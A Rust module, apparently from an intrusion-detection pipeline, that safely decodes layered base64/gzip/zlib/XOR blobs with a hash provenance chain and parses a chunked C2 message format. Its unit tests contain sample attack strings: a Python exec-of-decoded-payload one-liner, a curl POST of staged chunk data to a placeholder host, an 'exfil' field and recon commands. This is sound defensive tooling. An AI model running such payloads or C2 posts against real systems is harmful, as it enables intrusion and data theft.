//! agent-intrusion-worker port (#1610), decode_correlate.py half: a
//! bounded, non-executing recursive decoder (base64 -> gzip/zlib ->
//! single-byte-XOR-then-gzip, repeating up to a depth/size cap) with a
//! provenance chain, plus best-effort candidate-blob extraction from raw
//! sensor text. Never executes, evals, or imports anything from decoded
//! content — the result is always plain bytes handed back to the caller.
//!
//! `ChunkCorrelator` (stateful multi-event chunk reassembly) is
//! deliberately NOT ported: confirmed by grep against criticality_rules.py
//! that nothing in the live per-event rule pipeline ever instantiates it —
//! only the free function `parse_chunk_message` (single-event, structural
//! match only) is used live, by rule_chunked_c2_protocol.

use base64::Engine;
use regex::Regex;
use sha2::{Digest, Sha256};
use std::sync::LazyLock;

pub const MAX_DEPTH: u32 = 5;
pub const MAX_OUTPUT_BYTES: usize = 10 * 1024 * 1024;
const GZIP_MAGIC: [u8; 2] = [0x1f, 0x8b];

#[derive(Debug, Clone, PartialEq)]
pub struct DecodeStep {
    pub transform: String,
    pub input_sha256: String,
    pub output_sha256: String,
    pub output_len: usize,
}

#[derive(Debug, Clone, PartialEq)]
pub struct DecodeResult {
    pub ok: bool,
    pub output: Vec<u8>,
    pub chain: Vec<DecodeStep>,
    pub truncated: bool,
    pub reason: String,
}

fn sha256_hex(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Two-pass: standard alphabet, then URL-safe-to-standard translated —
/// a lone chunk of a multi-part message or a URL-safe blob would otherwise
/// never decode. validate=True-equivalent (reject non-alphabet chars
/// outright) via base64's STANDARD engine, which already rejects invalid
/// input rather than silently discarding characters.
fn try_base64(data: &[u8]) -> Option<Vec<u8>> {
    let pad = |v: &[u8]| -> Vec<u8> {
        let mut out = v.to_vec();
        let rem = out.len() % 4;
        if rem != 0 {
            out.extend(std::iter::repeat_n(b'=', 4 - rem));
        }
        out
    };
    for variant in [
        data.to_vec(),
        data.iter()
            .map(|&b| match b {
                b'-' => b'+',
                b'_' => b'/',
                other => other,
            })
            .collect::<Vec<u8>>(),
    ] {
        let padded = pad(&variant);
        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(&padded) {
            return Some(decoded);
        }
    }
    None
}

fn gzip_decompress(data: &[u8]) -> Option<Vec<u8>> {
    use std::io::Read;
    let mut out = Vec::new();
    flate2::read::GzDecoder::new(data)
        .read_to_end(&mut out)
        .ok()?;
    Some(out)
}

fn zlib_decompress(data: &[u8]) -> Option<Vec<u8>> {
    use std::io::Read;
    let mut out = Vec::new();
    flate2::read::ZlibDecoder::new(data)
        .read_to_end(&mut out)
        .ok()?;
    Some(out)
}

fn try_decompress(data: &[u8]) -> Option<(Vec<u8>, &'static str)> {
    if data.len() >= 2 && data[..2] == GZIP_MAGIC {
        return gzip_decompress(data).map(|out| (out, "gzip"));
    }
    zlib_decompress(data).map(|out| (out, "zlib"))
}

/// Brute-forces every single-byte XOR key (256 candidates) looking for one
/// that reveals a gzip magic header on the first two bytes, then attempts
/// gzip-decompressing the whole buffer under that key.
fn try_xor_then_decompress(data: &[u8]) -> Option<(Vec<u8>, &'static str, u8)> {
    if data.len() < 2 {
        return None;
    }
    for key in 0u16..256 {
        let key = key as u8;
        if data[0] ^ key == GZIP_MAGIC[0] && data[1] ^ key == GZIP_MAGIC[1] {
            let unxored: Vec<u8> = data.iter().map(|b| b ^ key).collect();
            if let Some(out) = gzip_decompress(&unxored) {
                return Some((out, "gzip", key));
            }
        }
    }
    None
}

/// True if `data` decodes as UTF-8 with no control characters other than
/// common whitespace — real compressed-but-undecompressed binary data
/// essentially never satisfies this over any non-trivial length.
pub fn looks_like_text(data: &[u8]) -> bool {
    if data.is_empty() {
        return false;
    }
    let Ok(text) = std::str::from_utf8(data) else {
        return false;
    };
    text.chars().all(|c| {
        c.is_ascii_graphic()
            || c == ' '
            || c == '\t'
            || c == '\n'
            || c == '\r'
            || (!c.is_ascii() && !c.is_control())
    })
}

/// Repeatedly tries base64-decode, then gzip/zlib-decompress (with a
/// single-byte-XOR fallback), until nothing further peels off, the depth
/// cap is hit, or an intermediate result would exceed max_output. Never
/// panics on malformed/adversarial input.
pub fn bounded_decode(data: &[u8], max_depth: u32, max_output: usize) -> DecodeResult {
    let mut chain: Vec<DecodeStep> = Vec::new();
    let mut current = data.to_vec();
    let mut truncated = false;

    for _ in 0..max_depth {
        let input_hash = sha256_hex(&current);

        if let Some(decoded) = try_base64(&current) {
            if decoded != current {
                if decoded.len() > max_output {
                    return DecodeResult {
                        ok: false,
                        output: Vec::new(),
                        chain,
                        truncated: true,
                        reason: "base64 output exceeds max_output".into(),
                    };
                }
                chain.push(DecodeStep {
                    transform: "base64".into(),
                    input_sha256: input_hash,
                    output_sha256: sha256_hex(&decoded),
                    output_len: decoded.len(),
                });
                current = decoded;
                continue;
            }
        }

        if let Some((out, transform)) = try_decompress(&current) {
            if out.len() > max_output {
                return DecodeResult {
                    ok: false,
                    output: Vec::new(),
                    chain,
                    truncated: true,
                    reason: format!("{transform} output exceeds max_output"),
                };
            }
            chain.push(DecodeStep {
                transform: transform.into(),
                input_sha256: input_hash,
                output_sha256: sha256_hex(&out),
                output_len: out.len(),
            });
            current = out;
            continue;
        }

        if let Some((out, transform, key)) = try_xor_then_decompress(&current) {
            if out.len() > max_output {
                return DecodeResult {
                    ok: false,
                    output: Vec::new(),
                    chain,
                    truncated: true,
                    reason: format!("xor+{transform} output exceeds max_output"),
                };
            }
            chain.push(DecodeStep {
                transform: format!("xor:0x{key:02x}+{transform}"),
                input_sha256: input_hash,
                output_sha256: sha256_hex(&out),
                output_len: out.len(),
            });
            current = out;
            continue;
        }

        truncated = false;
        break;
    }

    if chain.is_empty() {
        return DecodeResult {
            ok: false,
            output: Vec::new(),
            chain,
            truncated,
            reason: "no base64/gzip/zlib/xor+gzip layer detected".into(),
        };
    }

    // Success requires either a *verified* transform (gzip/zlib, which
    // carry their own checksum) somewhere in the chain, or a final result
    // that looks like real text — a bare base64 decode has no integrity
    // check at all, so an incomplete/truncated blob can "successfully"
    // base64-decode into high-entropy noise with no further layer
    // detected. A legitimate plain (uncompressed) base64-only payload must
    // still succeed, distinguished by its final bytes looking like text.
    let verified_transforms = ["gzip", "zlib"];
    let has_verified_step = chain.iter().any(|step| {
        verified_transforms.contains(&step.transform.as_str())
            || step
                .transform
                .rsplit_once('+')
                .map(|(_, tail)| verified_transforms.contains(&tail))
                .unwrap_or(false)
    });
    if !has_verified_step && !looks_like_text(&current) {
        return DecodeResult {
            ok: false,
            output: Vec::new(),
            chain,
            truncated,
            reason: "decoded through base64 only, and the result doesn't look like real text -- \
                     no gzip/zlib/xor+gzip layer ever verified it; likely truncated or not actually encoded"
                .into(),
        };
    }
    DecodeResult {
        ok: true,
        output: current,
        chain,
        truncated,
        reason: String::new(),
    }
}

static DATA_FIELD_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"data=([A-Za-z0-9+/_=-]{8,})").unwrap());
static PY_LITERAL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"b64decode\(['"]([A-Za-z0-9+/_=-]{8,})['"]\)"#).unwrap());
static BARE_B64_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b[A-Za-z0-9+/]{20,}={0,2}").unwrap());

/// Best-effort extraction of the one substring in a raw sensor string most
/// likely to be an encoded payload — known protocol shapes first (most
/// specific), falling back to the longest bare base64-alphabet run.
pub fn extract_candidate_blob(raw_text: &str) -> Option<String> {
    if let Some(caps) = DATA_FIELD_RE.captures(raw_text) {
        return Some(caps[1].to_string());
    }
    if let Some(caps) = PY_LITERAL_RE.captures(raw_text) {
        return Some(caps[1].to_string());
    }
    BARE_B64_RE
        .find_iter(raw_text)
        .max_by_key(|m| m.len())
        .map(|m| m.as_str().to_string())
}

#[derive(Debug, Clone, PartialEq)]
pub struct ChunkMessage {
    pub msg_type: String,
    pub channel: String,
    pub seq: u64,
    pub data: String,
    pub checksum: Option<String>,
}

static TYPE_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"type=([A-Za-z0-9_-]+)").unwrap());
static CHANNEL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"channel=([A-Za-z0-9]+)").unwrap());
static SEQ_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"seq=(\d+)").unwrap());
static CHK_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"chk=([A-Za-z0-9]+)").unwrap());

/// Parses the campaign's message-protocol shape
/// (type=stage&channel=c9f2&seq=1&chk=a91f&data=<blob>) out of a raw
/// sensor string. None for anything that isn't shaped like a chunked
/// message at all (most events aren't).
pub fn parse_chunk_message(raw_text: &str) -> Option<ChunkMessage> {
    if !raw_text.contains("channel=") || !raw_text.contains("seq=") {
        return None;
    }
    let msg_type = TYPE_RE.captures(raw_text)?[1].to_string();
    let channel = CHANNEL_RE.captures(raw_text)?[1].to_string();
    let seq: u64 = SEQ_RE.captures(raw_text)?[1].parse().ok()?;
    let data = DATA_FIELD_RE.captures(raw_text)?[1].to_string();
    let checksum = CHK_RE.captures(raw_text).map(|c| c[1].to_string());
    Some(ChunkMessage {
        msg_type,
        channel,
        seq,
        data,
        checksum,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn gzip_compress(data: &[u8]) -> Vec<u8> {
        use std::io::Write;
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(data).unwrap();
        enc.finish().unwrap()
    }

    fn zlib_compress(data: &[u8]) -> Vec<u8> {
        use std::io::Write;
        let mut enc = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(data).unwrap();
        enc.finish().unwrap()
    }

    fn b64(data: &[u8]) -> Vec<u8> {
        base64::engine::general_purpose::STANDARD
            .encode(data)
            .into_bytes()
    }

    #[test]
    fn plain_base64_gzip_decodes() {
        let payload = b"hello from a test";
        let blob = b64(&gzip_compress(payload));
        let result = bounded_decode(&blob, MAX_DEPTH, MAX_OUTPUT_BYTES);
        assert!(result.ok);
        assert_eq!(result.output, payload);
        assert_eq!(
            result
                .chain
                .iter()
                .map(|s| s.transform.as_str())
                .collect::<Vec<_>>(),
            vec!["base64", "gzip"]
        );
    }

    #[test]
    fn plain_base64_zlib_decodes() {
        let payload = b"zlib flavored payload";
        let blob = b64(&zlib_compress(payload));
        let result = bounded_decode(&blob, MAX_DEPTH, MAX_OUTPUT_BYTES);
        assert!(result.ok);
        assert_eq!(result.output, payload);
    }

    #[test]
    fn double_base64_decodes() {
        // A space guarantees this can never itself look like valid
        // base64, so the loop stops after exactly two layers.
        let payload = b"double wrapped payload";
        let blob = b64(&b64(payload));
        let result = bounded_decode(&blob, MAX_DEPTH, MAX_OUTPUT_BYTES);
        assert!(result.ok);
        assert_eq!(result.output, payload);
        assert_eq!(
            result
                .chain
                .iter()
                .map(|s| s.transform.as_str())
                .collect::<Vec<_>>(),
            vec!["base64", "base64"]
        );
    }

    #[test]
    fn xor_then_gzip_decodes() {
        let payload = b"xor obfuscated dropper stage";
        let key = 0x7Fu8;
        let compressed = gzip_compress(payload);
        let xored: Vec<u8> = compressed.iter().map(|b| b ^ key).collect();
        let blob = b64(&xored);
        let result = bounded_decode(&blob, MAX_DEPTH, MAX_OUTPUT_BYTES);
        assert!(result.ok);
        assert_eq!(result.output, payload);
        assert_eq!(
            result.chain.last().unwrap().transform,
            format!("xor:0x{key:02x}+gzip")
        );
    }

    #[test]
    fn xor_key_zero_is_tried() {
        let payload = b"key zero edge case";
        let compressed = gzip_compress(payload);
        let blob = b64(&compressed); // XOR with 0x00 is a no-op, still must be tried
        let result = bounded_decode(&blob, MAX_DEPTH, MAX_OUTPUT_BYTES);
        assert!(result.ok);
        assert_eq!(result.output, payload);
    }

    #[test]
    fn plain_text_with_no_encoding_fails_cleanly() {
        let result = bounded_decode(
            b"just an ordinary shell command, id; whoami",
            MAX_DEPTH,
            MAX_OUTPUT_BYTES,
        );
        assert!(!result.ok);
        assert!(result.reason.contains("no base64"));
    }

    #[test]
    fn garbage_bytes_never_panic() {
        let samples: Vec<Vec<u8>> = vec![
            [0x00, 0x01, 0x02, 0xff, 0xfe, 0xfd].repeat(20),
            b"====".to_vec(),
            b"AAAAA".to_vec(),
            Vec::new(),
            (0u16..256).map(|b| b as u8).collect(),
        ];
        for sample in samples {
            let _ = bounded_decode(&sample, MAX_DEPTH, MAX_OUTPUT_BYTES);
        }
    }

    #[test]
    fn output_size_cap_enforced() {
        let huge = vec![b'A'; 200];
        let blob = b64(&huge);
        let result = bounded_decode(&blob, MAX_DEPTH, 100);
        assert!(!result.ok);
        assert!(result.truncated);
    }

    #[test]
    fn depth_cap_enforced() {
        let payload = b"deeply nested".to_vec();
        let mut blob = payload.clone();
        for _ in 0..6 {
            blob = b64(&blob);
        }
        let result = bounded_decode(&blob, 3, MAX_OUTPUT_BYTES);
        assert!(result.ok);
        assert_eq!(result.chain.len(), 3);
        assert_ne!(result.output, payload);
    }

    #[test]
    fn provenance_hashes_are_real_sha256() {
        let payload = b"provenance check";
        let blob = b64(&gzip_compress(payload));
        let result = bounded_decode(&blob, MAX_DEPTH, MAX_OUTPUT_BYTES);
        assert_eq!(
            result.chain.first().unwrap().input_sha256,
            sha256_hex(&blob)
        );
        assert_eq!(
            result.chain.last().unwrap().output_sha256,
            sha256_hex(payload)
        );
    }

    #[test]
    fn extracts_data_field() {
        let text = "type=exfil&channel=c9f2&seq=1&chk=b12e&data=SGVsbG8=";
        assert_eq!(extract_candidate_blob(text).as_deref(), Some("SGVsbG8="));
    }

    #[test]
    fn extracts_python_literal() {
        let text = "python3 -c \"exec(gzip.decompress(base64.b64decode('SGVsbG8=')))\"";
        assert_eq!(extract_candidate_blob(text).as_deref(), Some("SGVsbG8="));
    }

    #[test]
    fn falls_back_to_longest_bare_run() {
        let text = "some noise ab short then a longer run QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo= end";
        assert_eq!(
            extract_candidate_blob(text).as_deref(),
            Some("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=")
        );
    }

    #[test]
    fn extract_candidate_returns_none_for_ordinary_command() {
        assert_eq!(extract_candidate_blob("id; whoami; uname -a"), None);
    }

    #[test]
    fn parses_full_chunk_message() {
        let text = "curl -s -X POST http://example/capture -d 'type=stage&channel=c9f2&seq=1&chk=a91f&data=AAAAAAAA'";
        let msg = parse_chunk_message(text).unwrap();
        assert_eq!(msg.msg_type, "stage");
        assert_eq!(msg.channel, "c9f2");
        assert_eq!(msg.seq, 1);
        assert_eq!(msg.checksum.as_deref(), Some("a91f"));
        assert_eq!(msg.data, "AAAAAAAA");
    }

    #[test]
    fn parse_chunk_message_none_for_single_shot_command() {
        let text = "python3 -c \"exec(gzip.decompress(base64.b64decode('SGVsbG8=')))\"";
        assert_eq!(parse_chunk_message(text), None);
    }

    #[test]
    fn parse_chunk_message_none_for_ordinary_command() {
        assert_eq!(parse_chunk_message("id; whoami"), None);
    }
}
